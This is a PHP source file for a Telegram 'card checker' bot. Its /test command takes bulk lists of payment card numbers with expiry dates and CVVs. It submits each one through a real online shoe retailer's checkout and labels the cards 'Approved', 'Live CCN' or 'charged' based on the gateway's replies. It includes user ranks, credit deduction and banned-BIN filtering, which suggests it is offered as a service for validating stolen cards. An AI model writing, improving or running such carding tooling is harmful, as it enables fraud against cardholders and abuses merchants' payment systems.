<?php
list($cmd) = explode(" ", $message);
if($cmd == "/test" or $cmd == ".test" or $cmd == "!test"){  
is_duro();
$tiempo_inicial = microtime(true);
    deleteprm($userId);
    is_credits();
    deltecred($userId);
    is_gateroff('mass7');
    unlink(getcwd().'/cookie.txt');
    $Mi_Id = "5168647868";
        $targetas = substr($message, 6);
    if (empty($targetas)){
        reply_to($chatId, $message_id,$keyboard,'<b>Mass Charged $10%0AFormat: cc|m|y|cvv</b>');
        die();
    }
    $bin = substr($targetas, 0,6);
    $bines = bannedbin($bin);
        if($bines == true){
            reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
            exit();
        }


$antispmatim = antispamCheck($userId);
    if($antispmatim != False ){
       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
        exit();
    }
$antispmatim = antispamCheckperemium($userId);
    if($antispmatim != False ){
       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
        exit();
    }
#Rango 
$nui = infouser($userId);
    $Rank = $nui['apodo'];
if($gId == $Mi_Id){
    $Rank = "Owner";
    $GLOBALS['Rank'] = $Rank;
}elseif($userId == verifiAdmin($userId)){
    $Rank ="Admin";
    $GLOBALS['Rank'] = $Rank;
}elseif($userId == veritimepremium($userId)){
   $Rank = $nui['apodo'];
}elseif($chatId == verifiCharAdmin($chatId)){
    $Rank = "Free User";
    $GLOBALS['Rank'] = $Rank;
}
elseif($userId == verificadroCrdediuser($userId)){
    $Rank ="Free user";
    $GLOBALS['Rank'] =$Rank;
}

#fin 


    $m1 = bot("sendmessage", [
        "chat_id" => $chatId,
        "text" => "<b>Wait for Result...</b>",
        "parse_mode" => "html",
        "reply_to_message_id" => $message_id,
    ]);

    $ms1 = capture(json_encode($m1), '"message_id":', ",");
    $allcards = multiexplode(["\n", " "], $targetas);
    //aki comienza el limite de ccs a checkar
    if (count($allcards) <= 10000000) {
        $resultados = "";
        $num = 0;
        foreach ($allcards as $card) {
            $num = ++$num;
            $resultados .=
                "<b>Card: <code>$card</code> \n" .
                PAYY($card) .
                "</b>\n";
            $m2 = bot("editMessageText", [
                "chat_id" => $chatId,
                "text" => $resultados,
                "parse_mode" => "html",
                "message_id" => $ms1,
            ]);

            $ms2 = capture(json_encode($m2), '"message_id":', ",");
        }
        $tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
        bot("editMessageText", [
            "chat_id" => $chatId,
            "text" => $resultados . "<b>ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼
Proxy  - ğŸ‚ Live! âœ… 
Time in Progress - ğŸ‚ $tiempo s
Checked by: <a href='tg://user?id=$userId'>$username</a>[$Rank]
Bot by  - ğŸ‚ Thkss
ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</b>",
            "parse_mode" => "html",
            "message_id" => $ms2,
        ]);

    } else {
        bot("editMessageText", [
            "chat_id" => $chatId,
            "text" => "Error Maximo",
            "parse_mode" => "html",
            "message_id" => $ms1,
        ]);
    }
}

function PAYY($lista)
{
    $separa = explode("|", $lista);
    $ccs = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
    $mes = $separa[1];
    $ano = $separa[2];
    $cvv = $separa[3];
    $cc = clean($ccs);



$result2 = AutoSF_US('https://www.shoepalace.com/products/heelys-he100757h-pro-20-grade-school-lifestyle-shoes-black?variant=41016634147022',''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');

if ($result2 == ""){
$status = "Approved! CNN ğŸŸ©";
$response = "Your card's security code is incorrect. ğŸŸ©";
restarCredito($userId);
}elseif ($result2 == 'Street address and postal code do not match.'){ 
$status = "Approved AVS!ğŸŸ©";
$response = "AVS YES!ğŸŸ©";
restarCredito($userId);
}
elseif(strpos($result2, 'Your account is almost ready!')){ 
    $status = "Approved!ğŸŸ©";
    $response = "Your account is almost ready!ğŸŸ©";
    restarCredito($userId);
}elseif ($result2 ==  'No Match'){ 
$status = "Live CCN! ğŸŸ©";
$response = 'The security code is incorrect.ğŸŸ©';
restarCredito($userId);
}elseif (strpos($result2, "card_error_authentication_required") ||(strpos($result2,'three_d_secure_redirect'))){ 
$status = "[ DECLINED ğŸ”´ ]";
$response = "3D Card.âŒ";
}elseif (strpos($result2, "Insufficient funds in the account")){ 
$status = "Approved!ğŸŸ©";
$response = "";
}elseif (strpos($result2, "")){ 
$status = "[charged]";
$response = "charged";
}elseif (strpos($result2, "invalid_account")){ 
$status = "[ DECLINED ğŸ”´ ]";
$response = "invalid_account";

}elseif ((strpos($result2, "Your cart has been updated and the previous shipping rate isnâ€™t valid. Select a new rate")) || (strpos($result2, "transaction_not_allowed"))){
    $status = "<b>CARD DECLINED âŒ</b>";
    $response = "Your card does not support this type of purchaseğŸŸ¥";
}elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
    $status = "<b>CARD DECLINED âŒ</b>";
    $response = "<b>LOST CARD</b>";
  }
  elseif ((strpos($result2, "No match")) || (strpos($result2, "lost_card")) || (strpos($result2, "fraudulent card"))){
    $status = "<b>[ DECLINED ğŸ”´ ]</b>";
    $response = "<b>FRAUDULENT CARD</b>";
  }elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
    $status = "<b>CARD EXPIRED âŒ</b>";
    $response = "<b>EXPIRED CARD</b>";
  }
  elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'Call to a member function')) || (strpos($result2, 'incorrect_number'))){
    $status = "<b>INVALID CARD âŒ</b>";
    $response = "<b>INCORRECT NUMBER</b>";
  }
  elseif ((strpos($result2, 'Sorry, there was an error completing your purchase -- please try again.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'Call to a member function')) || (strpos($result2, 'incorrect_number'))){
    $status = "<b>[ DECLINED ğŸ”´ ]</b>";
    $response = "<b>try again</b>";
  }
  elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'incorrect-number')) || (strpos($result2, 'incorrect_number'))){
$status = "<b>[ DECLINED ğŸ”´ ]</b>";
$response = "<b>INCORRECT NUMBER</b>";
}elseif (strpos($result2, "Card was declined")){
$status = "<b>[ DECLINED ğŸ”´ ]</b>";
$response = "<b>Card was declined</b>";
}else{
$status = "[ DECLINED ğŸ”´ ]";
$response = "$result2";
   }

    return "Status - ğŸ‚ $status
Response - ğŸ‚ $response";
}